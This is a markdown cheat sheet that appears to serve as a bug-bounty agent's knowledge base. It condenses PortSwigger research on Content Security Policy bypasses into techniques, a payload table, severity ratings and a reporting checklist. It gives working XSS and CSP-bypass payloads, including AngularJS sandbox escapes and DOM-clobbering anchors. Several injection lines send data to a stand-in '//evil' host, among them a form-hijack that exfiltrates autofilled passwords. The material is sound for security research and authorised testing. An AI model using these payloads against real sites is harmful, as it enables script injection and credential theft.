# CSP Bypass — Research Articles Compendium

> Source: 13 PortSwigger Research articles on CSP bypass, 2016-2024 (Heyes, Kettle et al). Extracts: `_portswigger-extracts/articles/`.

## Article Map

| Year | Title | Contribution |
|---|---|---|
| 2016 | Bypassing CSP using polyglot JPEGs | JS/JPEG polyglot vs script-src 'self' uploads |
| 2017 | When security features collide | Cloudflare rewriting beats WAF/XSS filters/CSP |
| 2018 | Evading CSP with DOM-based dangling markup | base/form target → window.name theft |
| 2019 | Bypassing CSP with policy injection | Reflected policy param; script-src-elem override |
| 2019 | AngularJS CSP bypass in 56 characters | ng-focus + orderBy sandbox escape |
| 2019 | Bypassing AngularJS bind HTML | SVG use cross-origin beats ng-bind-html <1.5.0 |
| 2021 | Hunting nonce-based CSP bypasses | Dynamic analysis finds gadget → script.src |
| 2022 | Bypassing CSP with dangling iframes | about:blank nav → cross-origin window.name |
| 2022 | Stealing passwords from infosec Mastodon | HTML filter bypass → form hijack creds |
| 2022 | Using Hackability to uncover a Chrome infoleak | about:blank cross-window infoleak; SOP bug |
| 2023 | Bypassing CSP via DOM clobbering | Clobber gadget → script.src under strict-dynamic |
| 2023 | Ambushed by AngularJS (Piwik PRO) | 3rd-party ng-app gadget beats nonce CSP |
| 2024 | Using form hijacking to bypass CSP | default-src misses form-action; scan checks |

## Key Techniques

- **Polyglot JPEG** — valid JPEG is valid JS: header `FF D8 FF E0 09 3A 4A 46 49 46 2F 2A` = JS label + open comment; payload `*/=alert(1)/*` in JPEG comment; close before EOI. Needs same-origin uploads + script-src 'self'; set `charset=ISO-8859-1`.
- **Policy injection** — GET param reflected in policy (report-uri token). Chrome: append `;script-src-elem *` to override script-src. Edge: `;_` drops whole policy.
- **AngularJS 56-char** — `<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>`; pre-Chrome-109: `$event.path|orderBy:'x&&[alert].pop()(1)'`.
- **ng-bind-html** — AngularJS <1.5.0 allows SVG: `<svg><use href=//evil/x.svg#x>` loads external SVG (ACAO:*) firing `onerror` on target origin.
- **Nonce hunting (dynamic analysis)** — nonce CSP only as strong as site JS. Hunt gadgets where attacker data reaches `script.src`/config of a nonce'd script; DOM Invader stack traces.
- **Dangling iframes** — set cross-origin iframe to about:blank → SOP treats as same-origin: read `window.name`, `ancestorOrigins`, probe names via typeof.
- **DOM clobbering** — injection + gadget + policy-allowed sink. Two anchors clobber config of a strict-dynamic script: `<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>` rewrites `script.src`.
- **Form hijacking** — `default-src` does NOT cover `form-action`. Inject `<form action=//evil>`/`formaction`; password managers autofill injected inputs → cred theft (Mastodon; PortSwigger paid $1.5k).
- **DOM dangling markup** — `<base target="` sets every link's window.name to markup after quote; one click, attacker reads `name` cross-domain. Survives `default-src 'none'; base-uri 'none'`. 2-click variant: hidden input + button + `<form id=x target="`.
- **Features collide** — server-side rewriting (Cloudflare email obfuscation) reassembles attacker syntax → beats WAF, XSS filters, whitelist CSP.
- **VueJS/AngularJS gadgets** — allowlisted 3rd-party script introducing ng-app/framework templating re-enables template exec under nonce CSP (Piwik debug flag).

## Payload / Bypass Table

| Technique | CSP weakness | Exploit |
|---|---|---|
| Polyglot JPEG | script-src 'self'; same-origin uploads | `<script charset=ISO-8859-1 src=/u/x.jpg>` |
| Policy injection | param reflected into policy | `?token=X;script-src-elem *` |
| AngularJS 56-char | AngularJS 1.x present | `<input id=x ng-focus=$event.composedPath()\|orderBy:'(y=alert)(1)'>` |
| ng-bind-html | AngularJS <1.5.0 allows SVG | `<svg><use href=//evil/x.svg#x>` |
| Nonce + gadget | strict-dynamic, controlled script.src | clobber config → page JS writes script |
| DOM clobbering | strict-dynamic + gadget sink | `<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>` |
| Dangling iframe | about:blank origin quirk | `frames[0].location='about:blank'` → window.name |
| Form hijack | form-action missing | `<form action=//evil><input type=password>` + autofill |
| Dangling markup | window.name cross-domain | `<a href=//evil>click</a><base target="` |
| DOM dangling (no base) | base-uri 'none', form target OK | hidden input + `<button form=x>` + `<form id=x target="` |
| Feature collision | WAF/obfuscation rewrites | invalid payload reassembled server-side |
| 3rd-party gadget | allowlisted script with ng-app | debug flag → template exec |

## By-Design / SKIP Filters

- Chrome blocks polyglot JPEG exec; Firefox needs ISO-8859-1 charset (2016-era engines).
- Chrome 97+ blocks raw `<` dangling markup; variants vary by engine version.
- Chrome 109+ removed `$event.path` → use `composedPath()`.
- AngularJS ≥1.5.0 blocks SVG in ng-bind-html; sandbox gone in 1.6 — version-specific.
- Nonce CSP with bug-free JS, no attacker-influenced script URLs: not bypassable.
- Report-Only CSP: misconfiguration finding, not a bypass.

## Severity Guide

- **MED/HIGH** — CSP bypass with script exec in target origin (alert(document.domain) proven).
- **INFO** — bypass without reachable sink (no exec/exfil).
- **INFORMATIONAL** — chain blocked/theoretical (gadget absent, engine patched).
- Form hijack + autofill cred theft: HIGH. Infoleak-only: LOW unless tokens readable.

## Reporting Checklist

- [ ] CSP enforced (not Report-Only); capture full header.
- [ ] Map weakness: allowlists, unsafe-inline/eval, missing form-action, reflected policy params, nonce+gadget.
- [ ] Prove exec in origin: alert(document.domain), console + screenshot.
- [ ] Record browser/version; retest cross-browser.
- [ ] Check same-origin uploads; server strips JPEG comments?
- [ ] DOM Invader: clobbering sinks, blank canary, stack traces.
- [ ] Form hijack: injected form, verify autofill + external POST.
- [ ] Dangling markup: data reaches attacker endpoint; note clicks needed.
- [ ] Audit 3rd-party scripts for ng-app/debug flags.
- [ ] Chain blocked: stop, document, rate INFORMATIONAL.

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
